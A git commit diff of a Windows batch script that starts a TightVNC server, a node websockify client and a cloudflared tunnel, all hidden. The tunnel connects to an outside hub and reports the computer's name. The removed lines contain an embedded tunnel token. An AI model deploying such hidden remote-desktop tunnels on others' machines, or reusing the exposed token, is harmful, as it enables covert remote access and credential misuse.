b4cb537214a2b6b963d45a96cad95ef592504556
QikDev <vokounvojta03@gmail.com>
2026-02-22 13:15:59 +0100

    Add files via upload

--- vnc.bat
+++ vnc.bat
@@ -1,18 +1,33 @@
 @echo off
+:: -------------------------------
+:: Windows VNC Client Connector – sequential ID
+:: -------------------------------
+
 set "NO_VNC_DIR=C:\ProgramData\server\noVnc"
+set "HUB_URL=vnc.qikseek.qzz.io"
+set "ID_FILE=%NO_VNC_DIR%\last_id.txt"
 
-:: Start TightVNC server hidden
-start "tight" "C:\Program Files\TightVNC\tvnserver.exe"
+:: Determine next sequential ID
+if exist "%ID_FILE%" (
+    set /p LAST_ID=<%ID_FILE%
+    set /a REPEATER_ID=LAST_ID+1
+) else (
+    set REPEATER_ID=1
+)
 
-:: Wait a few seconds for TightVNC to initialize
+echo %REPEATER_ID% > "%ID_FILE%"
+echo Connecting with repeater ID: %REPEATER_ID%
+
+:: Start TightVNC hidden
+start "" "C:\Program Files\TightVNC\tvnserver.exe"
 timeout /t 5 /nobreak >nul
 
-:: Run node hidden
-powershell -WindowStyle Hidden -Command "Start-Process node -ArgumentList 'config.js' -WorkingDirectory '%NO_VNC_DIR%' -WindowStyle Hidden"
+:: Run websockify client hidden
+powershell -WindowStyle Hidden -Command ^
+  "Start-Process node -ArgumentList 'config.js --repeater=%REPEATER_ID%' -WorkingDirectory '%NO_VNC_DIR%' -WindowStyle Hidden"
 
-:: Wait 5 seconds
 timeout /t 5 /nobreak >nul
 
-:: Run cloudflared tunnel hidden
-powershell -WindowStyle Hidden -Command "Start-Process cloudflared -ArgumentList 'tunnel run --token eyJhIjoiMzJkOThkNTA1ZmI1OTE4ODhiNjAzYWU1Y2EyYzFiNjUiLCJzIjoiTVdKa01qVmlOREl0TW1KbE1pMDBPVFF5TFdGaFltVXRNVFZtT0Rka01XVXdNalF6IiwidCI6IjJkMjRjMThmLTg5NTQtNGM4Yy05YTVkLWNjMzIxYTNkZjRmZCJ9' -WindowStyle Hidden"
-
+:: Connect to hub automatically with correct sequential ID
+powershell -WindowStyle Hidden -Command ^
+  "Start-Process cloudflared -ArgumentList 'tunnel --url http://%HUB_URL%:8080?repeater=%REPEATER_ID%&name=%COMPUTERNAME% --no-autoupdate' -WindowStyle Hidden"
